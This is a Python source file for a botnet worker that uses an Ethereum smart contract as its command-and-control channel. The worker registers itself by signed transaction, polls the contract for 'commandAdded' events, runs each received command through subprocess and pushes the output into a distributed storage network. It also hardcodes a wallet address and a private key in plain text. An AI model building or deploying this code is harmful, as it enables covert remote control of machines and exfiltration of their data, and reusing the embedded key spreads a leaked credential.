import subprocess
import yaml 
import json
import time

from web3 import Web3, HTTPProvider
from Worker import RPC_URL, CONFIG_FILE, storage_net, get_logger


#TODO use environment variables
my_address = "0xd8BA99d4B6e45607EF5904F056E820e64175E390"
pk ="5e455e6349d94bd651399427c9e9b23e7aacdef218fd3a17ff8af9f9d3cf04a3"

#log = get_logger('kademlia')



class Worker:
    #
    #   storage_net: running node is a network with the methods: store(item), stop(),
    #       and must provide an 'id'
    #   
    #   config_file : must contain an address and ABI
    #   TODO: add chainID to config
    #
    def __init__(self, storage_net, config_file) -> None:
        self._net = storage_net
        self.web3 = Web3(HTTPProvider(RPC_URL))
        self.contract = self.load_contract(config_file)
        self.stopped = False
        self.logger = get_logger(__name__)

    #load contract from config
    def load_contract(self, config_file):
        with open(config_file) as f:
            conf = yaml.safe_load(f)
        abi = conf['contract']['abi']
        address = conf['contract']['address']
        contract = self.web3.eth.contract(address=address, abi=abi)
        return contract
    
    #
    #   join the botnet and start fetching commads
    #
    def start(self):
        self.logger.info('Worker is joining the botnet...')
        self.join()
        self.logger.info('Worker is waiting for commands...')
        self.fetch_commands()
    
    #
    #   Send a join request to the contract
    #
    def join(self):
        txn = self.create_join_txn()
        self.sign_and_send(txn)
    
    #
    #   returns a transaction
    #     
    def create_join_txn(self):
        join_txn = self.contract.functions.join(self._net.id).buildTransaction(
            {
                "chainId": 4,
                "gasPrice": self.web3.eth.gas_price,
                "from": my_address,
                "nonce": self.web3.eth.getTransactionCount(my_address),
            }
        ) 
        return join_txn
    
    #
    #   signs and send the given transaction
    #
    def sign_and_send(self, txn):
        signed_txn = self.web3.eth.account.sign_transaction(
            txn, private_key=pk
        )
        tx_hash = self.web3.eth.send_raw_transaction(signed_txn.rawTransaction)
        tx_receipt = self.web3.eth.wait_for_transaction_receipt(tx_hash)
        return tx_receipt

    #
    #   waits for commands to be added to the blockchain
    #
    def fetch_commands(self):
        cmd_event = self.contract.events.commandAdded.createFilter(fromBlock='latest') 
        def log_loop(event_filter, poll_interval, handler):
            while not self.stopped:
                try:
                    for event in event_filter.get_new_entries():
                        handler(self.web3.toJSON(event))
                    time.sleep(poll_interval)
                except Exception as e:
                    pass

        log_loop(cmd_event, 10, self.handle_command)

    #
    #   Reads command event and retrieves the command
    #   executes and stores the command
    #
    #   TODO Use multiprocessing to execute commands, and push thier results into queue.
    #   Have a seaparate thread pulling complete commands from the queue, and storing them
    #
    def handle_command(self, cmd_event):
        cmd_dict = json.loads(cmd_event)
        worker_key = cmd_dict["args"]["workerKey"]
        cmd = cmd_dict["args"]["cmd"]
        if worker_key == self._net.id or worker_key == "ALL": 
            self.logger.info('Worker is executing a command...')
            res = self.execute(cmd)
            self.logger.info('Worker is storing the result...') 
            self.store_result(res)
            self.logger.info('Worker has stored the result.') 

    
    def execute(self, cmd): 
        res = subprocess.run(cmd.split(' '), stdout=subprocess.PIPE, stderr=subprocess.STDOUT)   
        return res.stdout.decode()

    def store_result(self, res):
        self._net.store(res)

    def stop(self):
        self.stopped = True
        self._net.stop()
        self.logger.info('Worker has stopped')

if __name__ == "__main__":
    worker = Worker(storage_net, CONFIG_FILE)
    try:
        worker.start()
    except KeyboardInterrupt:
        pass
    finally:
        worker.stop()